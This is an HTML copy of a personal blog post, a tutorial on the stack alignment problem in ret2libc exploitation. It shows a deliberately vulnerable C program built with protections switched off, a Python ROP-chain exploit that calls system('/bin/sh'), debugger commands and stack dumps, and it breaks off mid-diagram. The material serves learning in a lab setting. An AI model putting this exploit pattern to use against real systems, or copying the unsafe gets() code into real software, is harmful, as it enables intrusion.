<!DOCTYPE html>
<html lang="en" dir="auto" data-theme="auto">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>The Stack allignment problem | Rahul Mishra</title>
<meta name="keywords" content="">
<meta name="description" content="While learning about ret2libc exploitation, I encountered a stack alignment issue that initially confused me. After spending some time debugging, I finally understood why we add that extra ret instruct for the solution. I thought it would be valuable to share this insight with you all, in case it helps someone facing the same problem.
‍
Lets look at the memory layout

‍
Our key interest Right now, is the stack!">
<meta name="author" content="Me">
<link rel="canonical" href="http://localhost:1313/blogs/stack-allignment-problem/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.da3211e5ef867bf2b75fd5a6515cfed7195c011e8ab735694e203810a827097b.css" integrity="sha256-2jIR5e&#43;Ge/K3X9WmUVz&#43;1xlcAR6KtzVpTiA4EKgnCXs=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://localhost:1313/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="http://localhost:1313/blogs/stack-allignment-problem/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
                color-scheme: dark;
            }

            .list {
                background: var(--theme);
            }

            .toc {
                background: var(--entry);
            }
        }

        @media (prefers-color-scheme: light) {
            .list::-webkit-scrollbar-thumb {
                border-color: var(--code-bg);
            }
        }

    </style>
</noscript>
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.querySelector("html").dataset.theme = 'dark';
    } else if (localStorage.getItem("pref-theme") === "light") {
       document.querySelector("html").dataset.theme = 'light';
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.querySelector("html").dataset.theme = 'dark';
    } else {
        document.querySelector("html").dataset.theme = 'light';
    }

</script><meta property="og:url" content="http://localhost:1313/blogs/stack-allignment-problem/">
  <meta property="og:site_name" content="Rahul Mishra">
  <meta property="og:title" content="The Stack allignment problem">
  <meta property="og:description" content="While learning about ret2libc exploitation, I encountered a stack alignment issue that initially confused me. After spending some time debugging, I finally understood why we add that extra ret instruct for the solution. I thought it would be valuable to share this insight with you all, in case it helps someone facing the same problem.
‍
Lets look at the memory layout
‍
Our key interest Right now, is the stack!">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="blogs">
    <meta property="article:published_time" content="2025-06-10T00:00:00+00:00">
    <meta property="article:modified_time" content="2025-06-10T00:00:00+00:00">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="The Stack allignment problem">
<meta name="twitter:description" content="While learning about ret2libc exploitation, I encountered a stack alignment issue that initially confused me. After spending some time debugging, I finally understood why we add that extra ret instruct for the solution. I thought it would be valuable to share this insight with you all, in case it helps someone facing the same problem.
‍
Lets look at the memory layout

‍
Our key interest Right now, is the stack!">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Blogs",
      "item": "http://localhost:1313/blogs/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "The Stack allignment problem",
      "item": "http://localhost:1313/blogs/stack-allignment-problem/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "The Stack allignment problem",
  "name": "The Stack allignment problem",
  "description": "While learning about ret2libc exploitation, I encountered a stack alignment issue that initially confused me. After spending some time debugging, I finally understood why we add that extra ret instruct for the solution. I thought it would be valuable to share this insight with you all, in case it helps someone facing the same problem.\n‍\nLets look at the memory layout\n‍\nOur key interest Right now, is the stack!\n",
  "keywords": [
    
  ],
  "articleBody": "While learning about ret2libc exploitation, I encountered a stack alignment issue that initially confused me. After spending some time debugging, I finally understood why we add that extra ret instruct for the solution. I thought it would be valuable to share this insight with you all, in case it helps someone facing the same problem.\n‍\nLets look at the memory layout\n‍\nOur key interest Right now, is the stack!\nStack is a part of memory used for: Function calls (return addresses) Function arguments (sometimes if your function has more than 6 argument) Local variables ‍ The first 6 arguments are on the following Registers (RDI, RSI, RDX, RCX, R8, R9), rest of the arguments will get into Stack\nNow, you must be aware with buffer overflow and ret2libc attacks for proceeding further on this article.\n‍\n#include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e // Vulnerable function void vuln_func() { char buffer[8]; // Small buffer (8 bytes) puts(\"The buffer is small now, enter some data:\"); //gets() is unsafe and causes buffer overflows. gets(buffer); } int main() { puts(\"Calling vulnerable function...\"); vuln_func(); return 0; } ‍\nall: gcc -no-pie -fno-stack-protector vulnerable.c -o vulnerable -D_FORTIFY_SOURCE=0 -std=c99 clean: rm -f vulnerablee This compiles your vulnerable.c​​ file with exploitation-friendly settings\n‍\n+-------------------------------------------------------------+ | GCC Compilation Flags | +------------------------+------------------------------------+ | Flag | Description | +------------------------+------------------------------------+ | -no-pie | Disables PIE (Position-Independent | | | Executable). | | | Ensures fixed memory addresses in | | | the binary (e.g., main, puts). | +------------------------+------------------------------------+ | -fno-stack-protector | Disables stack canary protection. | | | Allows buffer overflows without | | | detection. | +------------------------+------------------------------------+ | -D_FORTIFY_SOURCE=0 | Turns off extra glibc checks for | | | functions like gets(), strcpy(). | | | Prevents automatic abort on unsafe | | | operations. | +------------------------+------------------------------------+ | -std=c99 | Compiles using C99 standard. | | | Ensures compatibility and better | | | behavior in modern compilers. | +------------------------+------------------------------------+ | -z execstack (missing) | This flag is NOT included here. | | | It would allow execution on stack | | | (needed for shellcode sometimes). | | | This binary has non-executable | | | stack (default in modern Linux). | +------------------------+------------------------------------+ ‍\n‍\nFile: exploit.py ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 1 │ import struct 2 │ libc_base = 0x7ffff7da9000 3 │ payload = b\"A\" * 8 # offset to rbp 4 │ payload += b\"B\" * 8 # rbp 5 │ payload += struct.pack(\"",
  "wordCount" : "1425",
  "inLanguage": "en",
  "datePublished": "2025-06-10T00:00:00Z",
  "dateModified": "2025-06-10T00:00:00Z",
  "author":{
    "@type": "Person",
    "name": "Me"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "http://localhost:1313/blogs/stack-allignment-problem/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Rahul Mishra",
    "logo": {
      "@type": "ImageObject",
      "url": "http://localhost:1313/favicon.ico"
    }
  }
}
</script>
</head>
<body id="top">
    <header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://localhost:1313/" accesskey="h" title="Home (Alt + H)">
                <img src="http://localhost:1313/apple-touch-icon.png" alt="" aria-label="logo"
                    height="35">Home</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://localhost:1313/blogs/" title="blogs">
                    <span>blogs</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/projects/" title="projects">
                    <span>projects</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/blogs/">Blogs</a></div>
    <h1 class="post-title entry-hint-parent">
      The Stack allignment problem
    </h1>
    <div class="post-meta"><span title='2025-06-10 00:00:00 +0000 UTC'>June 10, 2025</span>&nbsp;·&nbsp;<span>7 min</span>&nbsp;·&nbsp;<span>1425 words</span>&nbsp;·&nbsp;<span>Me</span>&nbsp;|&nbsp;<span>
    <a href="https://github.com/rivian96/rivian96.github.io/content/blogs/stack-allignment-problem.md" rel="noopener noreferrer edit" target="_blank">Suggest Changes</a>
</span>

</div>
  </header> 
  <div class="post-content"><p>While learning about ret2libc exploitation, I encountered a stack alignment issue that initially confused me. After spending some time debugging, I finally understood why we add that extra ret instruct for the solution. I thought it would be valuable to share this insight with you all, in case it helps someone facing the same problem.</p>
<p>‍</p>
<p><strong>Lets look at the memory layout</strong></p>
<p><img alt="image" loading="lazy" src="/blogs/the-stack-allignment-problem/image-20250615121128-wuoskjb.png"></p>
<p>‍</p>
<p><strong>Our key interest Right now, is the stack!</strong></p>
<h3 id="stack-is-a-part-of-memory-used-for">Stack is a part of memory used for:<a hidden class="anchor" aria-hidden="true" href="#stack-is-a-part-of-memory-used-for">#</a></h3>
<ul>
<li><strong>Function calls</strong> (return addresses)</li>
<li><strong>Function arguments</strong> (sometimes if your function has more than 6 argument)</li>
<li><strong>Local variables</strong></li>
<li>‍</li>
</ul>
<blockquote>
<p>The first 6 arguments are on the following Registers (RDI, RSI, RDX, RCX, R8, R9), rest of the arguments will get into Stack</p>
</blockquote>
<p><img alt="image" loading="lazy" src="/blogs/the-stack-allignment-problem/image-20250613132559-dtky5o7.png"></p>
<p>Now, you must be aware with buffer overflow and ret2libc attacks for proceeding further on this article.</p>
<p>‍</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mathematica" data-lang="mathematica"><span class="line"><span class="cl"><span class="nv">#</span><span class="n">include</span><span class="w"> </span><span class="o">&lt;</span><span class="n">stdio</span><span class="err">.</span><span class="n">h</span><span class="o">&gt;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nv">#</span><span class="n">include</span><span class="w"> </span><span class="o">&lt;</span><span class="n">stdlib</span><span class="err">.</span><span class="n">h</span><span class="o">&gt;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">//</span><span class="w"> </span><span class="n">Vulnerable</span><span class="w"> </span><span class="n">function</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">void</span><span class="w"> </span><span class="nv">vuln_func</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">char</span><span class="w"> </span><span class="n">buffer</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span><span class="w">  </span><span class="o">//</span><span class="w"> </span><span class="n">Small</span><span class="w"> </span><span class="n">buffer</span><span class="w"> </span><span class="p">(</span><span class="mi">8</span><span class="w"> </span><span class="n">bytes</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">puts</span><span class="p">(</span><span class="s">&#34;The buffer is small now, enter some data:&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">     </span><span class="o">//</span><span class="n">gets</span><span class="p">()</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">unsafe</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="n">causes</span><span class="w"> </span><span class="n">buffer</span><span class="w"> </span><span class="n">overflows</span><span class="err">.</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">int</span><span class="w"> </span><span class="n">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">puts</span><span class="p">(</span><span class="s">&#34;Calling vulnerable function...&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nv">vuln_func</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>‍</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-makefile" data-lang="makefile"><span class="line"><span class="cl"><span class="nf">all</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">	gcc -no-pie -fno-stack-protector vulnerable.c -o vulnerable  -D_FORTIFY_SOURCE<span class="o">=</span><span class="m">0</span>  -std<span class="o">=</span>c99 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">clean</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">	rm -f vulnerablee
</span></span></code></pre></div><p>This compiles your <code>vulnerable.c</code>​​ file with <strong>exploitation-friendly settings</strong></p>
<p>‍</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mathematica" data-lang="mathematica"><span class="line"><span class="cl"><span class="o">+-------------------------------------------------------------+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">                  </span><span class="n">GCC</span><span class="w"> </span><span class="n">Compilation</span><span class="w"> </span><span class="n">Flags</span><span class="w">                      </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+------------------------+------------------------------------+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">        </span><span class="n">Flag</span><span class="w">            </span><span class="o">|</span><span class="w">            </span><span class="n">Description</span><span class="w">             </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+------------------------+------------------------------------+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="o">-</span><span class="n">no</span><span class="o">-</span><span class="n">pie</span><span class="w">                </span><span class="o">|</span><span class="w"> </span><span class="n">Disables</span><span class="w"> </span><span class="n">PIE</span><span class="w"> </span><span class="p">(</span><span class="n">Position</span><span class="o">-</span><span class="n">Independent</span><span class="w"> </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">                        </span><span class="o">|</span><span class="w"> </span><span class="n">Executable</span><span class="p">)</span><span class="err">.</span><span class="w">                       </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">                        </span><span class="o">|</span><span class="w"> </span><span class="n">Ensures</span><span class="w"> </span><span class="n">fixed</span><span class="w"> </span><span class="n">memory</span><span class="w"> </span><span class="n">addresses</span><span class="w"> </span><span class="n">in</span><span class="w">  </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">                        </span><span class="o">|</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">binary</span><span class="w"> </span><span class="p">(</span><span class="n">e</span><span class="err">.</span><span class="n">g</span><span class="err">.</span><span class="p">,</span><span class="w"> </span><span class="n">main</span><span class="p">,</span><span class="w"> </span><span class="n">puts</span><span class="p">)</span><span class="err">.</span><span class="w">     </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+------------------------+------------------------------------+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="o">-</span><span class="n">fno</span><span class="o">-</span><span class="n">stack</span><span class="o">-</span><span class="n">protector</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">Disables</span><span class="w"> </span><span class="n">stack</span><span class="w"> </span><span class="n">canary</span><span class="w"> </span><span class="n">protection</span><span class="err">.</span><span class="w">  </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">                        </span><span class="o">|</span><span class="w"> </span><span class="n">Allows</span><span class="w"> </span><span class="n">buffer</span><span class="w"> </span><span class="n">overflows</span><span class="w"> </span><span class="n">without</span><span class="w">    </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">                        </span><span class="o">|</span><span class="w"> </span><span class="n">detection</span><span class="err">.</span><span class="w">                         </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+------------------------+------------------------------------+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="o">-</span><span class="nv">D_FORTIFY_SOURCE</span><span class="o">=</span><span class="mi">0</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="n">Turns</span><span class="w"> </span><span class="n">off</span><span class="w"> </span><span class="n">extra</span><span class="w"> </span><span class="n">glibc</span><span class="w"> </span><span class="n">checks</span><span class="w"> </span><span class="n">for</span><span class="w">   </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">                        </span><span class="o">|</span><span class="w"> </span><span class="n">functions</span><span class="w"> </span><span class="n">like</span><span class="w"> </span><span class="n">gets</span><span class="p">(),</span><span class="w"> </span><span class="n">strcpy</span><span class="p">()</span><span class="err">.</span><span class="w">   </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">                        </span><span class="o">|</span><span class="w"> </span><span class="n">Prevents</span><span class="w"> </span><span class="n">automatic</span><span class="w"> </span><span class="n">abort</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">unsafe</span><span class="w"> </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">                        </span><span class="o">|</span><span class="w"> </span><span class="n">operations</span><span class="err">.</span><span class="w">                        </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+------------------------+------------------------------------+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="o">-</span><span class="n">std</span><span class="o">=</span><span class="n">c99</span><span class="w">               </span><span class="o">|</span><span class="w"> </span><span class="n">Compiles</span><span class="w"> </span><span class="n">using</span><span class="w"> </span><span class="n">C99</span><span class="w"> </span><span class="n">standard</span><span class="err">.</span><span class="w">       </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">                        </span><span class="o">|</span><span class="w"> </span><span class="n">Ensures</span><span class="w"> </span><span class="n">compatibility</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="n">better</span><span class="w">   </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">                        </span><span class="o">|</span><span class="w"> </span><span class="n">behavior</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="n">modern</span><span class="w"> </span><span class="n">compilers</span><span class="err">.</span><span class="w">      </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+------------------------+------------------------------------+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="o">-</span><span class="n">z</span><span class="w"> </span><span class="n">execstack</span><span class="w"> </span><span class="p">(</span><span class="n">missing</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">This</span><span class="w"> </span><span class="n">flag</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">NOT</span><span class="w"> </span><span class="n">included</span><span class="w"> </span><span class="n">here</span><span class="err">.</span><span class="w">    </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">                        </span><span class="o">|</span><span class="w"> </span><span class="n">It</span><span class="w"> </span><span class="n">would</span><span class="w"> </span><span class="n">allow</span><span class="w"> </span><span class="n">execution</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">stack</span><span class="w">  </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">                        </span><span class="o">|</span><span class="w"> </span><span class="p">(</span><span class="n">needed</span><span class="w"> </span><span class="n">for</span><span class="w"> </span><span class="n">shellcode</span><span class="w"> </span><span class="n">sometimes</span><span class="p">)</span><span class="err">.</span><span class="w">  </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">                        </span><span class="o">|</span><span class="w"> </span><span class="n">This</span><span class="w"> </span><span class="n">binary</span><span class="w"> </span><span class="n">has</span><span class="w"> </span><span class="n">non</span><span class="o">-</span><span class="n">executable</span><span class="w">     </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">                        </span><span class="o">|</span><span class="w"> </span><span class="n">stack</span><span class="w"> </span><span class="p">(</span><span class="n">default</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="n">modern</span><span class="w"> </span><span class="n">Linux</span><span class="p">)</span><span class="err">.</span><span class="w">   </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+------------------------+------------------------------------+</span><span class="w">
</span></span></span></code></pre></div><p>‍</p>
<p><img alt="image" loading="lazy" src="/blogs/the-stack-allignment-problem/image-20250619001922-4gid30k.png"></p>
<p>‍</p>
<pre tabindex="0"><code class="language-pgsql" data-lang="pgsql"> File: exploit.py

───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ import struct
   2   │ libc_base = 0x7ffff7da9000
   3   │ payload = b&#34;A&#34; * 8                                           # offset to rbp 
   4   │ payload += b&#34;B&#34; * 8                                          # rbp
   5   │ payload += struct.pack(&#34;&lt;Q&#34;, libc_base + 0x000000000002a145) # pop rdi; ret;
   6   │ payload += struct.pack(&#34;&lt;Q&#34;, 0x7ffff7f50ea4)                 # address of /bin/sh
   7   │ payload += struct.pack(&#34;&lt;Q&#34;, 0x7ffff7dfc110)                 # address of System function() 
   8   │ payload += struct.pack(&#34;&lt;Q&#34;, 0x7ffff7deb340)                 # address of exit function
   9   │ 
  10   │ #we are using option &lt;Q&gt;, because we want to convert these 64 bit addresses to little endian format
  11   │ 
  12   │ 
  13   │ # print(payload)
  14   │ with open(&#34;exploit1&#34;, &#34;wb&#34;) as f:
  15   │     f.write(payload)
  16   │ 
  17   │ print(&#34;Payload written to exploit1. Run with: `./vulnerable_program &lt; input.txt`&#34;)
</code></pre><p>‍</p>
<p>This is the exploit I wrote while performing a <strong>ret2libc attack</strong>. The goal is to call the <code>system()</code>​​ function with <code>&quot;/bin/sh&quot;</code>​​ as its argument in order to spawn a shell. To do this, we use a <strong>ROP gadget</strong> — specifically <code>pop rdi; ret</code>​​<span data-type="text" style="color: var(--b3-font-color10);"> </span>— which is used to load the address of the <code>&quot;/bin/sh&quot;</code>​​ string into the <strong>RDI register</strong>, as required by the x86-64 calling convention (where the first function argument is passed via RDI).</p>
<p>After setting up the argument, we place the address of the system() function in the chain, which will be executed next. Finally, we include the address of the exit function so that once system returns, the program exits cleanly without crashing.</p>
<p>‍</p>
<p>‍</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mathematica" data-lang="mathematica"><span class="line"><span class="cl"><span class="n">pwndbg</span><span class="o">&gt;</span><span class="w"> </span><span class="n">disassemble</span><span class="w"> </span><span class="nv">vuln_func</span><span class="w">
</span></span></span></code></pre></div><p>‍</p>
<p><img alt="image" loading="lazy" src="/blogs/the-stack-allignment-problem/image-20250614151815-v4quv7t.png"></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mathematica" data-lang="mathematica"><span class="line"><span class="cl"><span class="n">pwndbg</span><span class="o">&gt;</span><span class="w"> </span><span class="n">break</span><span class="w"> </span><span class="o">*</span><span class="mi">0</span><span class="n">x000000000040115b</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">             </span><span class="n">or</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">pwndbg</span><span class="o">&gt;</span><span class="w"> </span><span class="n">break</span><span class="w"> </span><span class="o">*</span><span class="nv">vuln_func</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">37</span><span class="w">
</span></span></span></code></pre></div><p>‍</p>
<p>run the binary with the exploit we wrote above.</p>
<p><img alt="image" loading="lazy" src="/blogs/the-stack-allignment-problem/image-20250614152132-n21cfu0.png"></p>
<p>‍</p>
<p>We hit the Brekpoint</p>
<p><img alt="image" loading="lazy" src="/blogs/the-stack-allignment-problem/image-20250614150240-ualnstw.png"></p>
<p>‍</p>
<p>The stack looks perfect</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mathematica" data-lang="mathematica"><span class="line"><span class="cl"><span class="err">────────────────────────────────────────────────────────────────────</span><span class="p">[</span><span class="w"> </span><span class="n">STACK</span><span class="w"> </span><span class="p">]</span><span class="err">────────────────────────────────────────────────────────────────────</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">00</span><span class="err">:</span><span class="mi">0000</span><span class="err">│</span><span class="w"> </span><span class="n">rsp</span><span class="w"> </span><span class="mi">0</span><span class="n">x7fffffffdc28</span><span class="w"> </span><span class="err">—▸</span><span class="w"> </span><span class="mi">0</span><span class="n">x7ffff7dd3145</span><span class="w"> </span><span class="p">(</span><span class="n">iconv</span><span class="o">+</span><span class="mi">181</span><span class="p">)</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="n">pop</span><span class="w"> </span><span class="n">rdi</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">01</span><span class="err">:</span><span class="mi">0008</span><span class="err">│</span><span class="w">     </span><span class="mi">0</span><span class="n">x7fffffffdc30</span><span class="w"> </span><span class="err">—▸</span><span class="w"> </span><span class="mi">0</span><span class="n">x7ffff7f50ea4</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="mi">0</span><span class="n">x68732f6e69622f</span><span class="w"> </span><span class="o">/*</span><span class="w"> </span><span class="err">&#39;</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span><span class="err">&#39;</span><span class="w"> </span><span class="o">*/</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">02</span><span class="err">:</span><span class="mi">0010</span><span class="err">│</span><span class="w">     </span><span class="mi">0</span><span class="n">x7fffffffdc38</span><span class="w"> </span><span class="err">—▸</span><span class="w"> </span><span class="mi">0</span><span class="n">x7ffff7dfc110</span><span class="w"> </span><span class="p">(</span><span class="n">system</span><span class="p">)</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="n">test</span><span class="w"> </span><span class="n">rdi</span><span class="p">,</span><span class="w"> </span><span class="n">rdi</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">03</span><span class="err">:</span><span class="mi">0018</span><span class="err">│</span><span class="w">     </span><span class="mi">0</span><span class="n">x7fffffffdc40</span><span class="w"> </span><span class="err">—▸</span><span class="w"> </span><span class="mi">0</span><span class="n">x7ffff7deb340</span><span class="w"> </span><span class="p">(</span><span class="n">exit</span><span class="p">)</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="n">sub</span><span class="w"> </span><span class="n">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="w">
</span></span></span></code></pre></div><p>‍</p>
<p><strong>Stack diagram</strong></p>
<pre tabindex="0"><code class="language-pgsql" data-lang="pgsql">               ┌────────────────────────────────────────────┐
  High addr →  │       &#34;AAAA AAAA&#34; (8‑byte padding)         │
               ├────────────────────────────────────────────┤
               │       &#34;BBBB BBBB&#34; (fake saved RBP)         │
               ├────────────────────────────────────────────┤
               │     0x7fffffffdc28 →  pop rdi ; ret (libc) │  ← first RET jumps here
